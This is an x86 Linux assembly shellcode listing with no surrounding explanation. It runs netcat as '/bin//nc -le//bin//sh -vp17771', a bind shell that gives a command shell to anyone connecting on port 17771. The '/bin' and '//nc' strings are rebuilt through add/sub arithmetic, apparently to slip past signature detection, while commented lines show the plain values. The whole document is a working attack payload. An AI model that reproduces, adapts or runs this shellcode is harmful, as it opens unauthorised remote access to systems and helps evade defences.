global _start
section .text
 _start:
    xor eax, eax
    mov edx, eax
    push eax
    ; push 0x31373737     ;-vp17771
    ; push 0x3170762d
    mov dword [esp - 4], 0x31373737
    mov dword [esp - 8], 0x3170762d 
    sub esp, 8
    mov esi, esp

    push eax 
    mov eax, 0x68732f2f
    push eax
    add eax, 0x5f63301
    sub eax, 1
    push eax
    sub eax, 0x3f03f602
    push eax
    ; mov dword [esp - 4], 0x68732f2f
    ; mov dword [esp - 8], 0x6e69622f
    ; mov dword [esp - 12], 0x2f656c2d
    ; sub esp, 12
    ; push 0x68732f2f     ;-le//bin//sh
    ; push 0x6e69622f
    ; push 0x2f656c2d
    mov edi, esp

    push edx
    ; push eax
    ; push 0x636e2f2f     ;/bin//nc
    ; push 0x6e69622f
    add eax, 0x3408c302
    push eax
    add eax, 0xafb3301
    sub eax, 1
    push eax
    mov ebx, esp
    mov eax, edx

    push edx
    push esi
    push edi
    push ebx
    mov ecx, esp
    mov al,11
    int 0x80

